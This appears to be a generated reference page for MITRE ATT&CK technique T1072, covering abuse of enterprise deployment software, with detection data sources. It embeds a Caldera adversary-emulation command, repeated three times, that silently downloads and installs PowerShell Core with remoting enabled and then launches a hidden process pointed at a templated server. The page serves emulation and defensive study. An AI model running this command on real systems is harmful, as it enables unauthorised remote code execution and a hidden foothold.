
# Third-party Software

## Description

### MITRE Description

> Third-party applications and software deployment systems may be in use in the network environment for administration purposes (e.g., SCCM, VNC, HBSS, Altiris, etc.). If an adversary gains access to these systems, then they may be able to execute code.

Adversaries may gain access to and use third-party systems installed within an enterprise network, such as administration, monitoring, and deployment systems as well as third-party gateways and jump servers used for managing other systems. Access to a third-party network-wide or enterprise-wide software system may enable an adversary to have remote code execution on all systems that are connected to such a system. The access may be used to laterally move to other systems, gather information, or cause a specific effect, such as wiping the hard drives on all endpoints.

The permissions required for this action vary by system configuration; local credentials may be sufficient with direct access to the third-party system, or specific domain credentials may be required. However, the system may require an administrative account to log in or to perform it's intended purpose.

## Aliases

```

```

## Additional Attributes

* Bypass: None
* Effective Permissions: None
* Network: None
* Permissions: ['User', 'Administrator', 'SYSTEM']
* Platforms: ['Linux', 'macOS', 'Windows']
* Remote: True
* Type: attack-pattern
* Wiki: https://attack.mitre.org/techniques/T1072

## Potential Commands

```
{'windows': {'psh': {'command': '$wc=New-Object System.Net.WebClient;\n$output="PowerShellCore.msi";\n$wc.DownloadFile("https://github.com/PowerShell/PowerShell/releases/download/v6.2.2/PowerShell-6.2.2-win-x64.msi", $output);\nStart-Process msiexec.exe -ArgumentList "/package PowerShellCore.msi /quiet ADD_EXPLORER_CONTEXT_MENU_OPENPOWERSHELL=1 ENABLE_PSREMOTING=1 REGISTER_MANIFEST=1" -Wait;\n$env:Path += ";C:\\Program Files\\Powershell\\6";\nStart-Process pwsh -ArgumentList "-c #{location} -server #{server} - group #{group} -executors pwsh" -WindowStyle hidden;\n', 'cleanup': 'rm PowerShellCore.msi;\n'}}}
```

## Commands Dataset

```
[{'command': {'windows': {'psh': {'cleanup': 'rm PowerShellCore.msi;\n',
                                  'command': '$wc=New-Object '
                                             'System.Net.WebClient;\n'
                                             '$output="PowerShellCore.msi";\n'
                                             '$wc.DownloadFile("https://github.com/PowerShell/PowerShell/releases/download/v6.2.2/PowerShell-6.2.2-win-x64.msi", '
                                             '$output);\n'
                                             'Start-Process msiexec.exe '
                                             '-ArgumentList "/package '
                                             'PowerShellCore.msi /quiet '
                                             'ADD_EXPLORER_CONTEXT_MENU_OPENPOWERSHELL=1 '
                                             'ENABLE_PSREMOTING=1 '
                                             'REGISTER_MANIFEST=1" -Wait;\n'
                                             '$env:Path += ";C:\\Program '
                                             'Files\\Powershell\\6";\n'
                                             'Start-Process pwsh -ArgumentList '
                                             '"-c #{location} -server '
                                             '#{server} - group #{group} '
                                             '-executors pwsh" -WindowStyle '
                                             'hidden;\n'}}},
  'name': 'Download, install and start new process under PowerShell Core 6',
  'source': 'data/abilities/execution/60f63260-39bb-4136-87a0-b6c2dca799fc.yml'}]
```

## Potential Detections

```json
[{'data_source': ['4688', 'Process Execution']},
 {'data_source': ['5156', 'Windows Firewall']},
 {'data_source': ['4663', 'File monitoring']},
 {'data_source': ['4657', 'Windows Registry']},
 {'data_source': ['Binary file metadata']},
 {'data_source': ['Third-party application logs']},
 {'data_source': ['4688', 'Process Execution']},
 {'data_source': ['5156', 'Windows Firewall']},
 {'data_source': ['4663', 'File monitoring']},
 {'data_source': ['4657', 'Windows Registry']},
 {'data_source': ['LOG-MD B9', 'Binary file metadata']},
 {'data_source': ['Third-party application logs']}]
```

## Potential Queries

```json

```

## Raw Dataset

```json
[{'Mitre Stockpile - Download, install and start new process under PowerShell Core 6': {'description': 'Download, '
                                                                                                       'install '
                                                                                                       'and '
                                                                                                       'start '
                                                                                                       'new '
                                                                                                       'process '
                                                                                                       'under '
                                                                                                       'PowerShell '
                                                                                                       'Core '
                                                                                                       '6',
                                                                                        'id': '60f63260-39bb-4136-87a0-b6c2dca799fc',
                                                                                        'name': 'Install '
                                                                                                'PowerShell '
                                                                                                'Core '
                                                                                                '6',
                                                                                        'platforms': {'windows': {'psh': {'cleanup': 'rm '
                                                                                                                                     'PowerShellCore.msi;\n',
                                                                                                                          'command': '$wc=New-Object '
                                                                                                                                     'System.Net.WebClient;\n'
                                                                                                                                     '$output="PowerShellCore.msi";\n'
                                                                                                                                     '$wc.DownloadFile("https://github.com/PowerShell/PowerShell/releases/download/v6.2.2/PowerShell-6.2.2-win-x64.msi", '
                                                                                                                                     '$output);\n'
                                                                                                                                     'Start-Process '
                                                                                                                                     'msiexec.exe '
                                                                                                                                     '-ArgumentList '
                                                                                                                                     '"/package '
                                                                                                                                     'PowerShellCore.msi '
                                                                                                                                     '/quiet '
                                                                                                                                     'ADD_EXPLORER_CONTEXT_MENU_OPENPOWERSHELL=1 '
                                                                                                                                     'ENABLE_PSREMOTING=1 '
                                                                                                                                     'REGISTER_MANIFEST=1" '
                                                                                                                                     '-Wait;\n'
                                                                                                                                     '$env:Path '
                                                                                                                                     '+= '
                                                                                                                                     '";C:\\Program '
                                                                                                                                     'Files\\Powershell\\6";\n'
                                                                                                                                     'Start-Process '
                                                                                                                                     'pwsh '
                                                                                                                                     '-ArgumentList '
                                                                                                                                     '"-c '
                                                                                                                                     '#{location} '
                                                                                                                                     '-server '
                                                                                                                                     '#{server} '
                                                                                                                                     '- '
                                                                                                                                     'group '
                                                                                                                                     '#{group} '
                                                                                                                                     '-executors '
                                                                                                                                     'pwsh" '
                                                                                                                                     '-WindowStyle '
                                                                                                                                     'hidden;\n'}}},
                                                                                        'tactic': 'execution',
                                                                                        'technique': {'attack_id': 'T1072',
                                                                                                      'name': 'Third-party '
                                                                                                              'Software'}}}]
```

# Tactics


* [Execution](../tactics/Execution.md)

* [Lateral Movement](../tactics/Lateral-Movement.md)
    

# Mitigations

None

# Actors


* [Threat Group-1314](../actors/Threat-Group-1314.md)

